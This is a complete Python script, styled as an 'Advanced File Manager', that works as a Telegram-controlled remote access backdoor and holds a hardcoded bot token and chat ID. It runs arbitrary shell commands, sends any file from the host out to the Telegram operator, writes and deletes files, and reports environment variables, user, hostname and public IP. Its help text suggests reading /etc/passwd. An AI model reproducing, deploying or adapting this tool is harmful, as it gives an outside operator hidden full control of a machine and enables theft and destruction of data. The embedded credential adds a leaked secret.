#!/usr/bin/env python3
import subprocess
import requests
import time
import os
import sys
import platform
import socket
import getpass
from datetime import datetime
import shutil
import glob
import base64
import tempfile
import json

# ============================================
# Apnar Telegram Bot Details
# ============================================
BOT_TOKEN = "8788253260:AAEGH2EF_xiTGsS6Kvl8SocL8LrQK4f_86w"
CHAT_ID = "8258387050"

# ============================================
# Configuration
# ============================================
CHECK_INTERVAL = 2
MAX_OUTPUT_LENGTH = 3500
ALLOWED_EXTENSIONS = ['txt', 'py', 'sh', 'conf', 'log', 'ini', 'cfg', 'html', 'css', 'js', 'json', 'xml', 'csv', 'md']

class AdvancedFileShell:
    def __init__(self, token, chat_id):
        self.token = token
        self.chat_id = chat_id
        self.base_url = f"https://api.telegram.org/bot{token}"
        self.last_update_id = 0
        self.current_directory = self.get_root_directory()
        self.running = True
        self.edit_mode = False
        self.current_edit_file = None
        self.temp_files = {}
        
        # Initialize
        try:
            os.chdir(self.current_directory)
        except:
            self.current_directory = os.path.expanduser("~")
            os.chdir(self.current_directory)
    
    def get_root_directory(self):
        """System root directory ber kora"""
        if platform.system() == "Windows":
            return "C:\\"
        else:
            return "/"
    
    def send_message(self, text, parse_mode=None):
        """Telegram e message pathano"""
        if not text:
            text = "[Empty Output]"
        
        try:
            url = f"{self.base_url}/sendMessage"
            data = {
                "chat_id": self.chat_id,
                "text": text[:MAX_OUTPUT_LENGTH]
            }
            if parse_mode:
                data["parse_mode"] = parse_mode
            
            requests.post(url, data=data, timeout=5)
        except Exception as e:
            print(f"Send error: {e}")
    
    def send_file(self, file_path, caption=""):
        """Telegram e file pathano (READ operation)"""
        try:
            file_path = os.path.abspath(os.path.expanduser(file_path))
            
            if os.path.exists(file_path):
                url = f"{self.base_url}/sendDocument"
                
                with open(file_path, "rb") as f:
                    files = {"document": (os.path.basename(file_path), f, "application/octet-stream")}
                    data = {"chat_id": self.chat_id, "caption": caption[:200]}
                    response = requests.post(url, files=files, data=data, timeout=30)
                
                if response.status_code == 200:
                    self.send_message(f"✅ **File Uploaded:** `{file_path}`")
                    return True
                else:
                    self.send_message(f"❌ Upload failed: {response.text[:100]}")
                    return False
            else:
                self.send_message(f"❌ File not found: {file_path}")
                return False
        except Exception as e:
            self.send_message(f"❌ Error sending file: {str(e)}")
            return False
    
    def download_file(self, file_id, file_name, save_path=None):
        """Telegram theke file download kore save kora (WRITE operation)"""
        try:
            # Get file path from Telegram
            file_url = f"{self.base_url}/getFile"
            response = requests.get(file_url, params={"file_id": file_id})
            
            if response.status_code != 200:
                return False, "Could not get file info"
            
            file_path = response.json()["result"]["file_path"]
            download_url = f"https://api.telegram.org/file/bot{self.token}/{file_path}"
            
            # Download file
            file_content = requests.get(download_url, timeout=30)
            
            if file_content.status_code != 200:
                return False, "Download failed"
            
            # Determine save location
            if not save_path:
                save_path = os.path.join(self.current_directory, file_name)
            else:
                save_path = os.path.abspath(os.path.expanduser(save_path))
            
            # Save file
            with open(save_path, "wb") as f:
                f.write(file_content.content)
            
            return True, f"✅ **File Saved:** `{save_path}`\nSize: {len(file_content.content)} bytes"
            
        except Exception as e:
            return False, f"❌ Download error: {str(e)}"
    
    def read_file(self, filepath, lines=None):
        """File read kora (READ operation)"""
        try:
            filepath = os.path.abspath(os.path.expanduser(filepath))
            
            if not os.path.exists(filepath):
                return f"❌ File not found: {filepath}"
            
            if not os.path.isfile(filepath):
                return f"❌ Not a file: {filepath}"
            
            # Check file size
            size = os.path.getsize(filepath)
            if size > 500000:  # 500KB
                return f"❌ File too large ({size} bytes). Use:\n`download {filepath}`"
            
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                if lines:
                    # Read specific number of lines
                    content_lines = []
                    for i, line in enumerate(f):
                        if i >= lines:
                            break
                        content_lines.append(line.rstrip())
                    content = "\n".join(content_lines)
                    line_info = f" (first {lines} lines)"
                else:
                    content = f.read()
                    line_info = ""
            
            if len(content) > 3000:
                content = content[:3000] + f"\n\n... (truncated, total {len(content)} chars)"
            
            return f"📄 **File:** `{filepath}`{line_info}\n```\n{content}\n```"
            
        except Exception as e:
            return f"❌ Error reading file: {str(e)}"
    
    def write_file(self, filepath, content, mode="w"):
        """File write kora (WRITE operation)"""
        try:
            filepath = os.path.abspath(os.path.expanduser(filepath))
            
            # Create directory if needed
            os.makedirs(os.path.dirname(filepath), exist_ok=True)
            
            with open(filepath, mode, encoding='utf-8') as f:
                f.write(content)
            
            return f"✅ **File {'appended to' if mode=='a' else 'written'}:** `{filepath}`"
            
        except Exception as e:
            return f"❌ Error writing file: {str(e)}"
    
    def edit_file_nano(self, filepath):
        """Nano style file editing (simulated)"""
        try:
            filepath = os.path.abspath(os.path.expanduser(filepath))
            
            if os.path.exists(filepath):
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                self.send_message(f"✏️ **Editing:** `{filepath}`\n```\n{content[:2000]}\n```\nSend `/save` with new content")
            else:
                self.send_message(f"✏️ **Creating new file:** `{filepath}`\nSend `/save` with content")
            
            self.edit_mode = True
            self.current_edit_file = filepath
            return True
            
        except Exception as e:
            self.send_message(f"❌ Edit error: {str(e)}")
            return False
    
    def get_updates(self):
        """Telegram updates check"""
        try:
            url = f"{self.base_url}/getUpdates"
            params = {
                "offset": self.last_update_id + 1,
                "timeout": 5
            }
            response = requests.get(url, params=params, timeout=10)
            if response.status_code == 200:
                return response.json().get("result", [])
        except:
            pass
        return []
    
    def handle_file_upload(self, message):
        """Handle incoming file uploads"""
        try:
            # Check for document
            if "document" in message:
                doc = message["document"]
                file_id = doc["file_id"]
                file_name = doc["file_name"]
                
                # Ask where to save
                self.send_message(f"📥 **File Received:** `{file_name}`\n"
                                f"Size: {doc.get('file_size', 0)} bytes\n\n"
                                f"Send save location:\n"
                                f"`save {file_name} /path/to/save`\n"
                                f"Or:\n`save {file_name} .` (current dir)")
                
                # Store temporarily
                self.temp_files[file_id] = {
                    "name": file_name,
                    "size": doc.get("file_size", 0)
                }
                return True
            
            # Check for photo
            elif "photo" in message:
                photo = message["photo"][-1]  # Get highest quality
                file_id = photo["file_id"]
                
                self.send_message(f"🖼️ **Photo Received**\n"
                                f"Send save location:\n"
                                f"`save photo.jpg /path/to/save`")
                
                self.temp_files[file_id] = {
                    "name": "photo.jpg",
                    "type": "photo"
                }
                return True
            
        except Exception as e:
            self.send_message(f"❌ Upload handling error: {str(e)}")
        
        return False
    
    def execute_command(self, text, message=None):
        """Main command executor"""
        try:
            cmd_parts = text.strip().split()
            if not cmd_parts:
                return
            
            command = cmd_parts[0].lower()
            
            # ===== FILE READ OPERATIONS =====
            if command == "read" or command == "cat":
                if len(cmd_parts) > 1:
                    return self.read_file(cmd_parts[1])
                return "❌ Usage: `read /path/to/file`"
            
            elif command == "head":
                if len(cmd_parts) > 2:
                    return self.read_file(cmd_parts[2], int(cmd_parts[1]))
                elif len(cmd_parts) > 1:
                    return self.read_file(cmd_parts[1], 10)
                return "❌ Usage: `head [lines] /path/to/file`"
            
            elif command == "download" or command == "get":
                if len(cmd_parts) > 1:
                    filepath = " ".join(cmd_parts[1:])
                    self.send_file(filepath, f"📎 File from {socket.gethostname()}")
                    return f"📤 Download initiated for: {filepath}"
                return "❌ Usage: `download /path/to/file`"
            
            # ===== FILE WRITE OPERATIONS =====
            elif command == "write":
                if len(cmd_parts) > 2:
                    filepath = cmd_parts[1]
                    content = " ".join(cmd_parts[2:])
                    return self.write_file(filepath, content)
                return "❌ Usage: `write /path/to/file content here`"
            
            elif command == "append":
                if len(cmd_parts) > 2:
                    filepath = cmd_parts[1]
                    content = " ".join(cmd_parts[2:])
                    return self.write_file(filepath, content + "\n", "a")
                return "❌ Usage: `append /path/to/file content to add`"
            
            elif command == "edit" or command == "nano":
                if len(cmd_parts) > 1:
                    self.edit_file_nano(cmd_parts[1])
                    return "✏️ Edit mode activated. Send `/save` with new content"
                return "❌ Usage: `edit /path/to/file`"
            
            elif command == "/save":
                if self.edit_mode and self.current_edit_file:
                    content = text[5:].strip() if len(text) > 5 else ""
                    if content:
                        result = self.write_file(self.current_edit_file, content)
                        self.edit_mode = False
                        self.current_edit_file = None
                        return result
                    else:
                        return "❌ No content provided. Send `/save your content here`"
                return "❌ Not in edit mode. Use `edit /path/to/file` first"
            
            elif command == "mkdir":
                if len(cmd_parts) > 1:
                    path = " ".join(cmd_parts[1:])
                    os.makedirs(path, exist_ok=True)
                    return f"✅ Directory created: {path}"
                return "❌ Usage: `mkdir /path/to/dir`"
            
            elif command == "rm":
                if len(cmd_parts) > 1:
                    path = " ".join(cmd_parts[1:])
                    if os.path.isfile(path):
                        os.remove(path)
                        return f"✅ File deleted: {path}"
                    elif os.path.isdir(path):
                        shutil.rmtree(path)
                        return f"✅ Directory deleted: {path}"
                    return f"❌ Not found: {path}"
                return "❌ Usage: `rm /path/to/file_or_dir`"
            
            elif command == "save":
                if len(cmd_parts) > 2:
                    filename = cmd_parts[1]
                    save_path = " ".join(cmd_parts[2:])
                    
                    # Check if we have a pending file
                    if hasattr(self, 'pending_file_id'):
                        result, msg = self.download_file(self.pending_file_id, filename, save_path)
                        delattr(self, 'pending_file_id')
                        return msg
                    else:
                        return "❌ No pending file upload. Send a file first."
                return "❌ Usage: `save filename /path/to/save`"
            
            # ===== DIRECTORY NAVIGATION =====
            elif command == "cd":
                if len(cmd_parts) > 1:
                    return self.change_directory(" ".join(cmd_parts[1:]))
                return self.change_directory("~")
            
            elif command == "pwd":
                return f"📁 **Current Directory:** `{os.getcwd()}`"
            
            elif command == "ls" or command == "dir":
                path = " ".join(cmd_parts[1:]) if len(cmd_parts) > 1 else "."
                return self.list_directory(path)
            
            elif command == "ll" or command == "ls -la":
                path = " ".join(cmd_parts[1:]) if len(cmd_parts) > 1 else "."
                return self.list_directory_detailed(path)
            
            elif command == "tree":
                path = " ".join(cmd_parts[1:]) if len(cmd_parts) > 1 else "."
                return self.show_tree(path)
            
            elif command == "drives" or command == "mounts":
                return self.list_drives()
            
            # ===== SEARCH OPERATIONS =====
            elif command == "find":
                if len(cmd_parts) > 1:
                    return self.search_files(" ".join(cmd_parts[1:]))
                return "❌ Usage: `find filename_or_pattern`"
            
            elif command == "grep":
                if len(cmd_parts) > 2:
                    pattern = cmd_parts[1]
                    filepath = cmd_parts[2]
                    return self.grep_in_file(pattern, filepath)
                return "❌ Usage: `grep pattern /path/to/file`"
            
            elif command == "locate":
                if len(cmd_parts) > 1:
                    return self.locate_files(" ".join(cmd_parts[1:]))
                return "❌ Usage: `locate filename`"
            
            # ===== SYSTEM INFO =====
            elif command == "info":
                return self.get_system_info()
            
            elif command == "ps" or command == "tasks":
                return self.list_processes()
            
            elif command == "disk":
                return self.disk_usage()
            
            elif command == "who":
                return f"User: {getpass.getuser()}\nHost: {socket.gethostname()}\nOS: {platform.system()}"
            
            elif command == "env":
                return self.get_environment()
            
            elif command == "ip":
                return self.get_ip_info()
            
            # ===== FILE OPERATIONS =====
            elif command == "cp":
                if len(cmd_parts) > 2:
                    src = cmd_parts[1]
                    dst = " ".join(cmd_parts[2:])
                    shutil.copy2(src, dst)
                    return f"✅ Copied: {src} -> {dst}"
                return "❌ Usage: `cp source destination`"
            
            elif command == "mv":
                if len(cmd_parts) > 2:
                    src = cmd_parts[1]
                    dst = " ".join(cmd_parts[2:])
                    shutil.move(src, dst)
                    return f"✅ Moved: {src} -> {dst}"
                return "❌ Usage: `mv source destination`"
            
            elif command == "chmod":
                if len(cmd_parts) > 2 and platform.system() != "Windows":
                    mode = cmd_parts[1]
                    filepath = " ".join(cmd_parts[2:])
                    os.chmod(filepath, int(mode, 8))
                    return f"✅ Permissions changed: {filepath} ({mode})"
                return "❌ Usage: `chmod 755 /path/to/file`"
            
            # ===== HELP =====
            elif command == "help":
                return self.get_help()
            
            # ===== SHELL COMMANDS =====
            else:
                # Regular shell command
                return self.run_shell_command(text)
                
        except Exception as e:
            return f"❌ Command error: {str(e)}"
    
    def run_shell_command(self, command):
        """Run any shell command"""
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30,
                cwd=os.getcwd()
            )
            
            output = ""
            if result.stdout:
                output += result.stdout
            if result.stderr:
                output += f"\n⚠️ **Stderr:**\n{result.stderr}"
            
            if not output:
                output = "✅ Command executed (no output)"
            
            return output[:MAX_OUTPUT_LENGTH]
            
        except subprocess.TimeoutExpired:
            return "❌ Command timeout (30 seconds)"
        except Exception as e:
            return f"❌ Error: {str(e)}"
    
    def change_directory(self, path):
        """Directory change"""
        try:
            # Handle special paths
            if path == "~" or path == "home":
                path = os.path.expanduser("~")
            elif path == "/":
                path = self.get_root_directory()
            elif path == "..":
                path = os.path.dirname(os.getcwd())
            else:
                if not os.path.isabs(path):
                    path = os.path.join(os.getcwd(), path)
            
            os.chdir(path)
            new_dir = os.getcwd()
            
            # Show directory contents
            files = os.listdir('.')[:15]
            file_list = "\n".join(f"  {f}{'/' if os.path.isdir(f) else ''}" for f in files)
            
            return f"✅ **Directory changed**\n📁 `{new_dir}`\n\n📄 **Contents (first 15):**\n{file_list}"
            
        except Exception as e:
            return f"❌ Cannot change directory: {str(e)}"
    
    def list_directory(self, path="."):
        """List directory simple"""
        try:
            target = os.path.abspath(os.path.join(os.getcwd(), path))
            items = os.listdir(target)
            
            dirs = []
            files = []
            
            for item in sorted(items):
                full = os.path.join(target, item)
                if os.path.isdir(full):
                    dirs.append(f"📁 {item}/")
                else:
                    size = os.path.getsize(full)
                    if size < 1024:
                        size_str = f"{size} B"
                    elif size < 1024*1024:
                        size_str = f"{size/1024:.1f} KB"
                    else:
                        size_str = f"{size/(1024*1024):.1f} MB"
                    files.append(f"📄 {item} ({size_str})")
            
            result = [f"📁 **{target}**"]
            result.append("=" * 40)
            result.extend(dirs)
            result.extend(files)
            
            if not items:
                result.append("(empty directory)")
            
            return "\n".join(result)
            
        except Exception as e:
            return f"❌ Error: {str(e)}"
    
    def list_directory_detailed(self, path="."):
        """Detailed listing with permissions"""
        try:
            target = os.path.abspath(os.path.join(os.getcwd(), path))
            result = subprocess.run(
                f"ls -la {target}" if platform.system() != "Windows" else f"dir {target}",
                shell=True,
                capture_output=True,
                text=True
            )
            return result.stdout[:MAX_OUTPUT_LENGTH]
        except:
            return self.list_directory(path)
    
    def show_tree(self, path=".", depth=2):
        """Simple directory tree"""
        try:
            target = os.path.abspath(os.path.join(os.getcwd(), path))
            result = []
            result.append(f"🌳 **Directory Tree:** {target}")
            
            for root, dirs, files in os.walk(target):
                level = root.replace(target, '').count(os.sep)
                if level > depth:
                    continue
                indent = '  ' * level
                result.append(f"{indent}📁 {os.path.basename(root)}/")
                
                if level < depth:
                    subindent = '  ' * (level + 1)
                    for f in files[:5]:
                        result.append(f"{subindent}📄 {f}")
                    if len(files) > 5:
                        result.append(f"{subindent}... ({len(files)-5} more)")
            
            return "\n".join(result[:50])
        except:
            return "Tree view not available"
    
    def search_files(self, pattern):
        """Search files by name"""
        try:
            result = []
            result.append(f"🔍 **Searching for:** `{pattern}`")
            result.append("=" * 40)
            
            matches = []
            for root, dirs, files in os.walk(os.getcwd(), topdown=True, followlinks=False):
                if len(matches) > 50:
                    break
                    
                # Check directories
                for d in dirs:
                    if pattern.lower() in d.lower():
                        matches.append(os.path.join(root, d) + "/")
                        if len(matches) > 50:
                            break
                
                # Check files
                for f in files:
                    if pattern.lower() in f.lower():
                        matches.append(os.path.join(root, f))
                        if len(matches) > 50:
                            break
            
            if matches:
                for m in matches[:30]:
                    result.append(f"📌 {m}")
                if len(matches) > 30:
                    result.append(f"... and {len(matches)-30} more")
            else:
                result.append("No matches found")
            
            return "\n".join(result)
            
        except Exception as e:
            return f"❌ Search error: {str(e)}"
    
    def grep_in_file(self, pattern, filepath):
        """Search inside file"""
        try:
            filepath = os.path.abspath(os.path.expanduser(filepath))
            result = []
            result.append(f"🔍 **Grep in:** `{filepath}`")
            result.append(f"Pattern: `{pattern}`")
            result.append("=" * 40)
            
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                for i, line in enumerate(f, 1):
                    if pattern in line:
                        result.append(f"{i:4d}: {line.rstrip()[:100]}")
            
            if len(result) == 3:
                result.append("(no matches)")
            
            return "\n".join(result)
            
        except Exception as e:
            return f"❌ Grep error: {str(e)}"
    
    def locate_files(self, name):
        """Quick file locate (Linux)"""
        try:
            if platform.system() != "Windows":
                result = subprocess.run(
                    f"locate -l 20 -i {name}",
                    shell=True,
                    capture_output=True,
                    text=True
                )
                if result.stdout:
                    return f"🔍 **Locate results:**\n{result.stdout}"
            
            return self.search_files(name)
        except:
            return self.search_files(name)
    
    def list_drives(self):
        """List all drives"""
        result = ["💾 **Available Drives/Partitions**"]
        
        if platform.system() == "Windows":
            import string
            for letter in string.ascii_uppercase:
                drive = f"{letter}:\\"
                if os.path.exists(drive):
                    result.append(f"   💿 {drive}")
        else:
            try:
                df = subprocess.run("df -h", shell=True, capture_output=True, text=True)
                result.append("```\n" + df.stdout + "```")
            except:
                result.append("   📁 /")
                result.append("   📁 /home")
                result.append("   📁 /media")
                result.append("   📁 /mnt")
        
        return "\n".join(result)
    
    def get_system_info(self):
        """System information"""
        info = []
        info.append("🖥️ **SYSTEM INFORMATION**")
        info.append("=" * 40)
        info.append(f"Hostname: {socket.gethostname()}")
        info.append(f"User: {getpass.getuser()}")
        info.append(f"OS: {platform.system()} {platform.release()}")
        info.append(f"Arch: {platform.machine()}")
        info.append(f"Current Dir: {os.getcwd()}")
        info.append(f"Python: {platform.python_version()}")
        
        # IP info
        try:
            ip = requests.get("https://api.ipify.org", timeout=3).text
            info.append(f"Public IP: {ip}")
        except:
            pass
        
        return "\n".join(info)
    
    def list_processes(self):
        """List processes"""
        try:
            if platform.system() == "Windows":
                cmd = "tasklist"
            else:
                cmd = "ps aux | head -20"
            
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            return f"📊 **Processes:**\n```\n{result.stdout[:3000]}\n```"
        except:
            return "Cannot list processes"
    
    def disk_usage(self):
        """Disk usage"""
        try:
            if platform.system() == "Windows":
                cmd = "wmic logicaldisk get size,freespace,caption"
            else:
                cmd = "df -h"
            
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            return f"💾 **Disk Usage:**\n```\n{result.stdout}\n```"
        except:
            return "Disk usage info not available"
    
    def get_environment(self):
        """Environment variables"""
        env = dict(os.environ)
        result = ["🌍 **Environment:**"]
        for k, v in list(env.items())[:20]:
            result.append(f"   {k}={v[:50]}")
        return "\n".join(result)
    
    def get_ip_info(self):
        """IP information"""
        info = ["🌐 **Network Info:**"]
        
        # Local IP
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        info.append(f"   Local IP: {local_ip}")
        
        # Public IP
        try:
            public_ip = requests.get("https://api.ipify.org", timeout=3).text
            info.append(f"   Public IP: {public_ip}")
        except:
            pass
        
        return "\n".join(info)
    
    def handle_update(self, update):
        """Handle Telegram update"""
        try:
            message = update.get("message", {})
            chat_id = message.get("chat", {}).get("id", "")
            
            # Authorization check
            if str(chat_id) != str(self.chat_id):
                return
            
            # Check for file upload
            if self.handle_file_upload(message):
                return
            
            text = message.get("text", "")
            if not text:
                return
            
            # Special handling for edit mode
            if self.edit_mode and text.startswith("/save"):
                pass  # Will be handled in execute_command
            
            # Execute command
            result = self.execute_command(text, message)
            
            if result:
                prompt = f"{os.getcwd()}$ " if not self.edit_mode else "[EDIT MODE] "
                self.send_message(f"{prompt}{text}\n\n{result}")
            
        except Exception as e:
            self.send_message(f"❌ Error: {str(e)}")
    
    def get_help(self):
        """Comprehensive help"""
        help_text = """
🆘 **ADVANCED FILE MANAGER SHELL**
==================================

📁 **FILE READ OPERATIONS:**
  `read /path/file`     - Read file contents
  `cat /path/file`      - Same as read
  `head [n] /path/file` - First n lines (default 10)
  `download /path/file` - Get file via Telegram
  `grep pattern file`   - Search inside file

✏️ **FILE WRITE OPERATIONS:**
  `write /path/file content` - Write/overwrite file
  `append /path/file text`   - Append to file
  `edit /path/file`         - Nano-style edit mode
  `/save content`           - Save after edit
  `mkdir /path/dir`         - Create directory
  `rm /path/file`           - Delete file/dir

📤 **UPLOAD TO DEVICE:**
  *Send any file to bot*    - Upload to device
  `save filename /path`     - Save uploaded file

📂 **DIRECTORY:**
  `cd /path`     - Change directory
  `pwd`          - Current directory
  `ls [path]`    - List files
  `ll [path]`    - Detailed list
  `tree [path]`  - Directory tree
  `drives`       - Show all drives

🔍 **SEARCH:**
  `find name`    - Search files by name
  `locate name`  - Quick locate (Linux)
  `grep p file`  - Search in file

🖥️ **SYSTEM:**
  `info`    - System information
  `ps`      - Processes
  `disk`    - Disk usage
  `ip`      - IP information
  `who`     - Current user
  `env`     - Environment

📋 **FILE OPERATIONS:**
  `cp src dst`  - Copy file/dir
  `mv src dst`  - Move file/dir
  `chmod 755 f` - Permissions (Linux)

⚡ **SHELL:**
  Any command works! (ls, ps, ifconfig, etc.)

❓ **Example Workflow:**
  `cd /etc`
  `read passwd`
  `edit config.txt`
  `/save new content here`
  `download config.txt`
  *Send image.jpg to bot*
  `save image.jpg /home/user/`
"""
        return help_text
    
    def start(self):
        """Main loop"""
        startup = f"""🚀 **Advanced File Manager Started**
================================
🖥️ Host: {socket.gethostname()}
👤 User: {getpass.getuser()}
📂 Root: {self.current_directory}
⏰ Time: {datetime.now()}

**Features:**
✅ Read any file
✅ Write any file  
✅ Upload files to device
✅ Download files from device
✅ Nano-style editing
✅ Full shell access

Type `help` for commands"""
        
        self.send_message(startup)
        
        while self.running:
            try:
                updates = self.get_updates()
                for update in updates:
                    self.last_update_id = update["update_id"]
                    self.handle_update(update)
                
                time.sleep(CHECK_INTERVAL)
            except KeyboardInterrupt:
                break
            except Exception as e:
                time.sleep(5)

def main():
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE" or CHAT_ID == "YOUR_CHAT_ID_HERE":
        print("❌ Please set BOT_TOKEN and CHAT_ID")
        return
    
    shell = AdvancedFileShell(BOT_TOKEN, CHAT_ID)
    shell.start()

if __name__ == "__main__":
    main()
